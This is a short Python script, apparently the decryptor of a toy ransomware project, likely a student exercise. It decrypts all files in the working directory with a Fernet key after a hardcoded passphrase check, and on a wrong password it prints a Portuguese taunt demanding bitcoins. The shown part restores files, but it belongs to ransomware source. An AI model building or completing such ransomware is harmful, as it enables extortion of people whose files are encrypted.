#!/usr/bin/env Python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", "rb") as key:
    secretkey = key.read()
passphrase = "Fatec"
upassword = input ("Insira a senha: ")

if upassword == passphrase:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decrypt = Fernet(secretkey).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_decrypt)
        print("Descriptografado: ", file)
else:
    print("Senha errada vacilão, cadê meus bitcoins ? ")
